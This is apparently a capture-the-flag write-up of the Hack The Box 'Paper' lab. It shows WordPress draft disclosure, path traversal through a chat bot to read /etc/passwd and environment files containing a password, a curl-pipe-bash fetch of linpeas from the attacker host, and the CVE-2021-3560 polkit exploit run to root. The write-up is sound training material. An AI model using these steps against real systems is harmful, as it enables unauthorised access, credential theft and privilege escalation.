@@ -1,0 +1,480 @@
+HTB - LINUX - PAPER
+
+Two http default server pages one for http and https
+SSH is enabled
+
+Will now run feroxbuster on port 80 web page
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/linux/paper]
+└─$ feroxbuster -u http://10.10.11.143/
+=============================================================================================
+
+However we get various error messages.
+Will try gobuster
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/linux/paper]
+└─$ gobuster dir -u http://10.10.11.143/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.11.143/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/07/02 12:21:24 Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 199]
+/.htm                 (Status: 403) [Size: 199]
+/.                    (Status: 403) [Size: 199691]
+/manual               (Status: 301) [Size: 235] [--> http://10.10.11.143/manual/]
+/.htaccess            (Status: 403) [Size: 199]     
+=============================================================================================
+
+While we have the automated gobuster running, we can use burp suite to analyze the website 
+request and responses.
+
+One thing that is noticed is the response eliicits the following 
+X-Backend-Server: office.paper
+
+We can append this to hosts file and see what we get we refresh the web page.
+COMMANDS:
+=============================================================================================
+10.10.11.143 office.paper
+=============================================================================================
+
+We indeed have virtual host routing on the webserver, nmap did not output the necessary header
+information that was needed to notice this first.
+
+We could have used the banner plus to run it and notice the backend server name.
+You would need to add the banner plus script.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/linux/paper]
+└─$ sudo nmap --script banner-plus 10.10.11.143 -n -p 80
+=============================================================================================
+
+We have a wordpress site, which is a mock of the office "blunder tiffin" paper company.
+Since this is wordpress we could check by simply going to the wp-admin page and get redirected
+ 
+COMMANDS:
+=============================================================================================
+http://office.paper/wp-login.php?redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2F&reauth=1
+=============================================================================================
+
+Looking at page source we find the word press version
+
+COMMANDS:
+=============================================================================================
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://office.paper/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 5.2.3" />
+=============================================================================================
+
+We can run wpscan on the webserver
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/linux/paper]
+└─$ wpscan --url http://office.paper
+..
+..
+..
+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
+ |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
+..
+..
+..
+=============================================================================================
+
+We find the insecure version, now we fully run wpscan with plugins detection in an agressive 
+scan
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/linux/paper]
+└─$ wpscan --url http://office.paper -e ap --plugins-detection aggressive
+=============================================================================================
+
+We can try and look for for wordpress 5.2.3 exploits.
+
+We see that we have the following:
+WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
+COMMANDS:
+=============================================================================================
+Proof of Concept
+
+http://wordpress.local/?static=1&order=asc 
+=============================================================================================
+
+We add the ?static=1 at the end of the request we make.
+Removing the &order=asc 
+allows the dump of all post drafts.
+
+We get the following text:
+COMMANDS:
+=============================================================================================
+
+
+test
+
+Micheal please remove the secret from drafts for gods sake!
+
+Hello employees of Blunder Tiffin,
+
+Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.
+
+So, I kindly request you all to take your discussions from the public blog to a more private chat system.
+
+-Nick
+
+# Warning for Michael
+
+Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick
+
+Threat Level Midnight
+
+A MOTION PICTURE SCREENPLAY,
+WRITTEN AND DIRECTED BY
+MICHAEL SCOTT
+
+[INT:DAY]
+
+Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….
+
+# Secret Registration URL of new Employee chat system
+
+http://chat.office.paper/register/8qozr226AhkCHZdyY
+
+# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.
+
+# Also, stop looking at my drafts. Jeez!
+=============================================================================================
+
+We see the secret registration which we can use to add to our hosts file
+When we get there we get there we get a rocket chat sign up. 
+We now can use the secret egistration link and sign up kind of like discord.
+
+We are now in, we can also search for rokcet chat exploits.
+COMMANDS:
+=============================================================================================
+──(kali㉿kali)-[~/htb/linux/paper]
+└─$ searchsploit rocket chat 
+------------------------------------------------------------ ---------------------------------
+ Exploit Title                                              |  Path
+------------------------------------------------------------ ---------------------------------
+Rocket.Chat 2.1.0 - Cross-Site Scripting                    | linux/webapps/47537.txt
+Rocket.Chat 3.12.1 - NoSQL Injection (Unauthenticated)      | linux/webapps/49960.py
+Rocket.Chat 3.12.1 - NoSQL Injection to RCE (Unauthenticate | linux/webapps/50108.py
+------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+=============================================================================================
+
+Apparently going through the general channel chat, there is bot that is running called
+recyclops, the following is the text found
+COMMANDS:
+=============================================================================================
+Bot
+11:21 AM
+kellylikescupcakes Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers.
+Most frequently asked questions include:
+- What time is it?
+- What new files are in your sales directory?
+- Why did the salesman crossed the road?
+- What's the content of file x in your sales directory? etc.
+Please note that I am a beta version and I still have some bugs to be fixed.
+How to use me ? :
+1. Small Talk:
+You can ask me how dwight's weekend was, or did he watched the game last night etc.
+eg: 'recyclops how was your weekend?' or 'recyclops did you watched the game last night?' or 'recyclops what kind of bear is the best?
+2. Joke:
+You can ask me Why the salesman crossed the road.
+eg: 'recyclops why did the salesman crossed the road?'
+<=====The following two features are for those boneheads, who still don't know how to use scp. I'm Looking at you Kevin.=====>
+For security reasons, the access is limited to the Sales folder.
+3. Files:
+eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file src/test.php' or just 'recyclops file test.txt'
+4. List:
+You can ask me to list the files
+5. Time:
+You can ask me to what the time is
+eg: 'recyclops what time is it?' or just 'recyclops time'
+=============================================================================================
+
+We can ask the bot for files
+'recyclops file test.txt'
+COMMANDS:
+=============================================================================================
+1:13 PM
+recyclops file test.txt
+Bot
+1:13 PM
+cat: /home/dwight/sales/test.txt: No such file or directory
+=============================================================================================
+
+It is running cat. So we can try running command injection. There is some pretty good command
+injection filters. However we can still do directory traversal
+COMMANDS:
+=============================================================================================
+    Bot
+    1:15 PM
+    cat: /home/dwight/sales/../../../../../../passwd: No such file or directory
+    <!=====Contents of file ../../../../../../etc/passwd=====>
+    root❌0:0:root:/root:/bin/bash
+    bin❌1:1:bin:/bin:/sbin/nologin
+    daemon❌2:2:daemon:/sbin:/sbin/nologin
+    adm❌3:4:adm:/var/adm:/sbin/nologin
+    lp❌4:7:lp:/var/spool/lpd:/sbin/nologin
+    sync❌5:0:sync:/sbin:/bin/sync
+    shutdown❌6:0:shutdown:/sbin:/sbin/shutdown
+    halt❌7:0:halt:/sbin:/sbin/halt
+    mail❌8:12:mail:/var/spool/mail:/sbin/nologin
+    operator❌11:0:operator:/root:/sbin/nologin
+    games❌12💯games:/usr/games:/sbin/nologin
+    ftp❌14:50:FTP User:/var/ftp:/sbin/nologin
+    nobody❌65534:65534:Kernel Overflow User:/:/sbin/nologin
+    dbus❌81:81:System message bus:/:/sbin/nologin
+    systemd-coredump❌999:997:systemd Core Dumper:/:/sbin/nologin
+    systemd-resolve❌193:193:systemd Resolver:/:/sbin/nologin
+    tss❌59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+    polkitd❌998:996:User for polkitd:/:/sbin/nologin
+    geoclue❌997:994:User for geoclue:/var/lib/geoclue:/sbin/nologin
+    rtkit❌172:172:RealtimeKit:/proc:/sbin/nologin
+    qemu❌107:107:qemu user:/:/sbin/nologin
+    apache❌48:48:Apache:/usr/share/httpd:/sbin/nologin
+    cockpit-ws❌996:993:User for cockpit-ws:/:/sbin/nologin
+    pulse❌171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
+    usbmuxd❌113:113:usbmuxd user:/:/sbin/nologin
+    unbound❌995:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin
+    rpc❌32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+    gluster❌994:989:GlusterFS daemons:/run/gluster:/sbin/nologin
+    chrony❌993:987::/var/lib/chrony:/sbin/nologin
+    libstoragemgmt❌992:986:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
+    saslauth❌991:76:Saslauthd user:/run/saslauthd:/sbin/nologin
+    dnsmasq❌985:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
+    radvd❌75:75:radvd user:/:/sbin/nologin
+    clevis❌984:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin
+    pegasus❌66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
+    sssd❌983:981:User for sssd:/:/sbin/nologin
+    colord❌982:980:User for colord:/var/lib/colord:/sbin/nologin
+    rpcuser❌29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+    setroubleshoot❌981:979::/var/lib/setroubleshoot:/sbin/nologin
+    pipewire❌980:978:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin
+    gdm❌42:42::/var/lib/gdm:/sbin/nologin
+    gnome-initial-setup❌979:977::/run/gnome-initial-setup/:/sbin/nologin
+    insights❌978:976:Red Hat Insights:/var/lib/insights:/sbin/nologin
+    sshd❌74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+    avahi❌70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
+    tcpdump❌72:72::/:/sbin/nologin
+    mysql❌27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
+    nginx❌977:975:Nginx web server:/var/lib/nginx:/sbin/nologin
+    mongod❌976:974:mongod:/var/lib/mongo:/bin/false
+    rocketchat❌1001:1001::/home/rocketchat:/bin/bash
+    dwight❌1004:1004::/home/dwight:/bin/bash
+    <!=====End of file ../../../../../../etc/passwd=====>
+=============================================================================================
+
+We are able to get the contents of the passwd file and it's users.
+We can also check current proccesses by loking at specific file such as /proc/self/cmdline
+We can also check the environment variables.
+COMMANDS:
+=============================================================================================
+ <!=====Contents of file ../../../../../../proc/self/environ=====>
+RESPOND_TO_EDITED=trueROCKETCHAT_USER=recyclopsLANG=en_US.UTF-8OLDPWD=/home/dwight/hubotROCKETCHAT_URL=http://127.0.0.1:48320ROCKETCHAT_USESSL=falseXDG_SESSION_ID=1USER=dwightRESPOND_TO_DM=truePWD=/home/dwight/hubotHOME=/home/dwightPORT=8000ROCKETCHAT_PASSWORD=Queenofblad3s!23SHELL=/bin/shSHLVL=4BIND_ADDRESS=127.0.0.1LOGNAME=dwightDBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1004/busXDG_RUNTIME_DIR=/run/user/1004PATH=/home/dwight/hubot/node_modules/coffeescript/bin:node_modules/.bin:node_modules/hubot/node_modules/.bin:/usr/bin:/bin_=/usr/bin/cat
+<!=====End of file ../../../../../../proc/self/environ=====>
+=============================================================================================
+
+The user directory is dwight, we also find a rocket chat password.
+We can attempt to use this password Queenofblad3s!23
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/linux/paper]
+└─$ ssh dwight@10.10.11.143 
+The authenticity of host '10.10.11.143 (10.10.11.143)' can't be established.
+ED25519 key fingerprint is SHA256:9utZz963ewD/13oc9IYzRXf6sUEX4xOe/iUaMPTFInQ.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.143' (ED25519) to the list of known hosts.
+dwight@10.10.11.143's password: 
+Activate the web console with: systemctl enable --now cockpit.socket
+
+Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
+[dwight@paper ~]$ 
+[dwight@paper ~]$ cat user.txt 
+40f4a80fee6c7037fb082b72b051cf67
+=============================================================================================
+
+
+COMMANDS:
+=============================================================================================
+ <!=====Contents of file ../../../../../../proc/self/stat=====>
+8384 (cat) R 2458 1657 1657 0 -1 4210688 236 0 0 0 0 0 0 0 20 0 1 0 483479 7626752 228 18446744073709551615 94308077547520 94308077578824 140723433291392 0 0 0 0 0 0 0 0 0 17 1 0 0 0 0 0 94308079675984 94308079677632 94308104667136 140723433299318 140723433299374 140723433299374 140723433299947 0
+<!=====End of file ../../../../../../proc/self/stat=====>
+<!=====Contents of file ../../../../../../proc/2458/cmdline=====>
+node/home/dwight/hubot/node_modules/coffeescript/bin/coffee/home/dwight/hubot/node_modules/.bin/hubot-arocketchat
+<!=====End of file ../../../../../../proc/2458/cmdline=====>
+=============================================================================================
+
+We can list environment cariables via the following as well
+which has better layout of the output.
+COMMANDS:
+=============================================================================================
+recyclops file ../../../../../../proc/self/cwd/.env
+ <!=====Contents of file ../../../../../../proc/self/cwd/.env=====>
+export ROCKETCHAT_URL='http://127.0.0.1:48320'
+export ROCKETCHAT_USER=recyclops
+export ROCKETCHAT_PASSWORD=Queenofblad3s!23
+export ROCKETCHAT_USESSL=false
+export RESPOND_TO_DM=true
+export RESPOND_TO_EDITED=true
+export PORT=8000
+export BIND_ADDRESS=127.0.0.1
+<!=====End of file ../../../../../../proc/self/cwd/.env=====>
+
+=============================================================================================
+
+we can't run sudo, we find botrestart.sh, but can't prives from this 
+We can try look at the process forest but nothing of note.
+We can try and run linpeas for automatic scanning.
+
+COMMANDS:
+=============================================================================================
+──(kali㉿kali)-[~/htb/linux/paper/www]
+└─$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh 
+
+[dwight@paper ~]$ curl -L 10.10.14.8:8000/linpeas.sh | bash
+
+=============================================================================================
+
+As we go down the linpeas report we come to find that it is Vulnerable to CVE-2021-3560.
+We search google and find it is a policy kit escalation exploit
+COMMANDS:
+=============================================================================================
+https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
+=============================================================================================
+
+We can run it multiple time to get it to work
+COMMANDS:
+=============================================================================================
+[dwight@paper shm]$ bash poc.sh 
+
+[!] Username set as : secnigma
+[!] No Custom Timing specified.
+[!] Timing will be detected Automatically
+[!] Force flag not set.
+[!] Vulnerability checking is ENABLED!
+[!] Starting Vulnerability Checks...
+[!] Checking distribution...
+[!] Detected Linux distribution as "centos"
+[!] Checking if Accountsservice and Gnome-Control-Center is installed
+[+] Accounts service and Gnome-Control-Center Installation Found!!
+[!] Checking if polkit version is vulnerable
+[+] Polkit version appears to be vulnerable!!
+[!] Starting exploit...
+[!] Inserting Username secnigma...
+Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+id: ‘secnigma’: no such user
+[x] Insertion of Username failed!
+[!] Aborting Execution!
+[!] Usually multiple attempts are required to get the timing right. Try running the exploit again.
+[!] If the exploit doesn't work after several tries, then you may have to exploit this manually.
+
+..
+..
+..
+
+[dwight@paper shm]$ bash poc.sh 
+
+[!] Username set as : secnigma
+[!] No Custom Timing specified.
+[!] Timing will be detected Automatically
+[!] Force flag not set.
+[!] Vulnerability checking is ENABLED!
+[!] Starting Vulnerability Checks...
+[!] Checking distribution...
+[!] Detected Linux distribution as "centos"
+[!] Checking if Accountsservice and Gnome-Control-Center is installed
+[+] Accounts service and Gnome-Control-Center Installation Found!!
+[!] Checking if polkit version is vulnerable
+[+] Polkit version appears to be vulnerable!!
+[!] Starting exploit...
+[!] Inserting Username secnigma...
+Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+[+] Inserted Username secnigma  with UID 1005!
+[!] Inserting password hash...
+[!] It looks like the password insertion was succesful!
+[!] Try to login as the injected user using su - secnigma
+[!] When prompted for password, enter your password 
+[!] If the username is inserted, but the login fails; try running the exploit again.
+[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
+
+=============================================================================================
+
+COMMANDS:
+=============================================================================================
+[dwight@paper shm]$ bash poc.sh 
+
+[!] Username set as : secnigma
+[!] No Custom Timing specified.
+[!] Timing will be detected Automatically
+[!] Force flag not set.
+[!] Vulnerability checking is ENABLED!
+[!] Starting Vulnerability Checks...
+[!] Checking distribution...
+[!] Detected Linux distribution as "centos"
+[!] Checking if Accountsservice and Gnome-Control-Center is installed
+[+] Accounts service and Gnome-Control-Center Installation Found!!
+[!] Checking if polkit version is vulnerable
+[+] Polkit version appears to be vulnerable!!
+[!] Starting exploit...
+[!] Inserting Username secnigma...
+Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+[+] Inserted Username secnigma  with UID 1005!
+[!] Inserting password hash...
+[!] It looks like the password insertion was succesful!
+[!] Try to login as the injected user using su - secnigma
+[!] When prompted for password, enter your password 
+[!] If the username is inserted, but the login fails; try running the exploit again.
+[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
+[dwight@paper shm]$ su - secnigma
+Password: 
+[secnigma@paper ~]$ sudo bash
+[sudo] password for secnigma: 
+[root@paper secnigma]# ls
+[root@paper secnigma]# cd /
+[root@paper /]# ls
+bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
+boot  etc  lib   media  opt  root  sbin  sys  usr
+[root@paper /]# cd root/
+[root@paper ~]# ls
+anaconda-ks.cfg  initial-setup-ks.cfg  root.txt
+[root@paper ~]# cat root.txt 
+60586284df4e359ffbc068d876afa55f
+=============================================================================================
+
+COMMANDS:
+=============================================================================================
+=============================================================================================
+
+COMMANDS:
+=============================================================================================
+=============================================================================================
+
+COMMANDS:
+=============================================================================================
+=============================================================================================
+
+COMMANDS:
+=============================================================================================
+=============================================================================================
+
+COMMANDS:
+=============================================================================================
+=============================================================================================
+
+
